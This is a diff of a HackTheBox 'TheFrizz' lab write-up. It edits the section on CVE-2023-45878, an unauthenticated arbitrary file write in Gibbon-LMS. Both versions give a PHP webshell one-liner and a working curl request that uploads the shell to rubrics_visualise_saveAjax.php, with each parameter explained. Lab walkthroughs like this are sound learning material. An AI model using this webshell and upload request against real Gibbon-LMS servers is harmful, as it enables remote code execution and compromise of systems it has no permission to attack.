@@ -47,7 +47,7 @@ After the Nmap scan revealed the domain frizz.htb, I added it to /etc/hosts to e
 ---
 
 ## SMB 445, 139
-Checked smb via `nxc`. No creds so unable to proceed further here.
+Checked smb via `nxc`. Null session does not work, will move on until I get some creds.
 `nxc smb 10.129.232.168`
 ![](assets/img/htb/thefrizz/thefrizz9.png)
 
@@ -71,51 +71,34 @@ Ran `gobuster` against the Gibbon-LMS application for anything interesting.
 
 ### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
 
-While enumerating the Gibbon-LMS instance, I identified CVE-2023-45878 in the endpoint:
+#### Payload
 
-modules/Rubrics/rubrics_visualise_saveAjax.php
-
-The vulnerability exists because the application accepts a “base64 image” via the `img` parameter, but it:
-
-- does not require authentication,  
-- does not validate that the content is actually an image, and  
-- writes the decoded content to disk using a **user-controlled filename (`path`)**.
-
-This allows an attacker to disguise PHP code as image data, have the server decode it, and force it to be written as a `.php` file in the web root — resulting in remote code execution.
-
-#### Build the payload locally
-
-I created a minimal PHP webshell that executes any command passed via `?cmd=`:
+I created a minimal PHP webshell:
 
 `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
-
-#### Encode it for upload
 
 Because the endpoint expects base64 data, I encoded the file:
 
 `b64=$(base64 -w0 shell.php)`
 ![](assets/img/htb/thefrizz/thefrizz12.png)
+
 #### Upload the webshell
 
-I then abused the vulnerable endpoint to write the file to the server:
+I then abused the vulnerable endpoint to write the file to the server. gibbonPersonID is needed.
 
 `curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
 ![](assets/img/htb/thefrizz/thefrizz14.png)
 
 What each parameter does:
-
-- `img=image/png;asdf,${b64}`  
+`img=image/png;asdf,${b64}`  
   The server splits on the comma, base64-decodes everything on the right, and writes it to disk.  
   The `image/png;asdf` portion is just filler to satisfy the parser.
-
-- `path=shell.php`  
+`path=shell.php`  
   Controls the output filename. Because extensions are not restricted, I can choose `.php`.
-
-- `gibbonPersonID=0000000001`  
+`gibbonPersonID=0000000001`  
   A required application field that influences where the file is saved.
 
 If the upload succeeds, the endpoint echoes the filename back:
-
 `shell.php%`
 
 #### Verify remote code execution
